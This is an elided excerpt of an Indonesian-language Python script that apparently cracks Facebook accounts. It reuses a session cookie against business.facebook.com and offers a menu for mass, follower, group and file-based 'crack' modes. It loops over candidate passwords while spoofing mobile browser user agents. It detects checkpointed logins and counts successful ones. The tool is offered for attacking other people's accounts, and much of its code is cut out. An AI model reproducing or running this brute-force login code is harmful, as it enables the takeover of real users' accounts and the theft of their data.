...
for xd in range(10000):
	...
	l='Kiwi Chrome/69.1.3440.40 Mobile Safari/537.36'
...
def login_lagi334():
	try:
		...
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0; ALE-L21 Build/HuaweiALE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/69.1.3440.40 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
...
def menu(my_name,my_id):
	...
	cetak(nel('\tSelamat Datang [yellow]%s[white] bray'%(my_name)))
	print(f'>> Your Idz : '+str(my_id))
	print(f'>> Your Ip  : {ip}')
	print(f'>> Github   : {gh}')
	print('')
	cetak(nel('[cyan][white]1.Crack Massall/Publik\n[cyan][white]2.Crack Followeres \n[cyan][white]3.Crack Gerup \n[cyan][white]4.Crack File \n[cyan][white]5.Cek Hasil \n[cyan][white]0.Keluar [white] '))
...
def grup():
	...
	ua = 'Mozilla/5.0 (Linux; Android 6.0; ALE-L21 Build/HuaweiALE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/69.1.3440.40 Mobile Safari/537.36'
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel('[cyan][white]1.Crack Akun Olid\n[cyan][white]2.Crcak Akun muda[white] '))
	print('')
	hu = input('>> Pilih : ')
	if hu in ['1','01']:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				headapp={"user-agent":"NokiaX3-00/2.0 (p) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
				if 'no' in taplikasi:
					ok+=1
